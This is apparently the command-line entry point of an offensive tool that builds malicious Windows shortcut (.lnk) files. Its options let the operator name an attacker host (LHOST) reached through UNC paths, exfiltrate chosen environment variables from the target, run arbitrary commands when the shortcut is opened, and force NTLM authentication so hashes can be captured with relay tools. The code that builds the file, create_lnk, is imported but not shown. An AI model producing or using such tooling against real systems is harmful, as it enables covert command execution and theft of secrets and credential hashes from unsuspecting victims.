#!/usr/bin/env python3
import sys

from . import __name__ as prog
from . import __version__, create_lnk


def parse_args():
    import argparse
    import re

    CSV_RE = re.compile(r'(?<=")(?:[^"]|"{2})+?(?="(?:,|$))|[^",]+?(?=,|$)')
    is_csv = getattr(
        re.compile("{0}(?:,{0})*".format('(?:"(?:[^"]|"{2})+?"|[^",]+?)')),
        "fullmatch",
    )

    def csv_envvars(__s: str):
        if not is_csv(__s):
            raise ValueError
        for m in CSV_RE.finditer(__s):
            yield m[0].replace('""', '"')

    parser = argparse.ArgumentParser(
        prog=prog,
        allow_abbrev=False,
        formatter_class=argparse.ArgumentDefaultsHelpFormatter,
    )
    parser.add_argument(
        "-V",
        "--version",
        action="version",
        version=f"%(prog)s {__version__}",
    )
    parser.add_argument(
        dest="lhost",
        metavar="LHOST",
        help=(
            "host where data is exfiltrated, "
            "referenced in UNC paths in the generated file"
        ),
    )
    parser.add_argument(
        "-o",
        "--outfile",
        dest="outfile",
        metavar="OUTFILE",
        default="@aaa.lnk",
        help="path to save result .lnk file",
    )
    exfil_group = parser.add_argument_group(
        "exfiltration options",
        argument_default=argparse.SUPPRESS,
    )
    exfil_group.add_argument(
        "-e",
        "--env",
        dest="env_vars",
        action="extend",
        type=csv_envvars,
        metavar="VARNAME",
        help=(
            "environment variables to exfiltrate from the target. "
            "expects a comma-separated list: %(metavar)s[,%(metavar)s[,...]]"
        ),
    )
    exfil_group.add_argument(
        "-x",
        "--exec",
        dest="commands",
        metavar="CMD",
        action="append",
        help=(
            "command to execute on the target. "
            "this can be used multiple times, "
            "commands will be executed consecutively"
        ),
    )
    exfil_group.add_argument(
        "--ntlm",
        dest="ntlm",
        action="store_true",
        help=(
            "attempt NTLM authentication via the payload, "
            "to capture the hash with another tool (ntlmrelayx/responder/etc)"
        ),
    )
    return parser.parse_args()


def main():
    ns = parse_args()
    [command, *commands] = getattr(ns, "commands", [r"C:\Windows\explorer.exe ."])
    kwargs = {k: v for k, v in vars(ns).items() if k in {"env_vars", "lhost", "ntlm"}}
    create_lnk(ns.outfile, command, *commands, **kwargs)

    from os.path import abspath

    return print(f"file saved to {abspath(ns.outfile)!r}")


if __name__ == "__main__":
    sys.exit(main())
